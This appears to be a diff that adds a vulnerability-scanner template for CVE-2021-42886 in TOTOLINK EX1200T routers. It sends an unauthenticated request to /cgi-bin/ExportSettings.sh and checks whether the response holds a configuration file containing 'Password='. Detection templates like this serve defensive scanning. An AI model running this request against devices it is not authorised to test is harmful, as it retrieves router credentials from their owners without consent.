@@ -1,0 +1,38 @@
+id: cve-2021-42886
+info:
+  name: TOTOLINK EX1200T ExportSettings.sh Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    TOTOLINK EX1200T V4.1.2cu.5215 has a security vulnerability. An attacker can use this vulnerability to obtain the apmib configuration file without authorization, and the username and password can be found in the decoded file.
+  tags:
+    - information-disclosure
+    - totolink
+  classification:
+    cve-id: CVE-2021-42886
+    cvss-score: 9.0
+  reference:
+    - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202206-455
+
+variables:
+  filename: "ExportSettings.sh"
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - ".dat\""
+      - type: word
+        part: body
+        words:
+          - "Password="
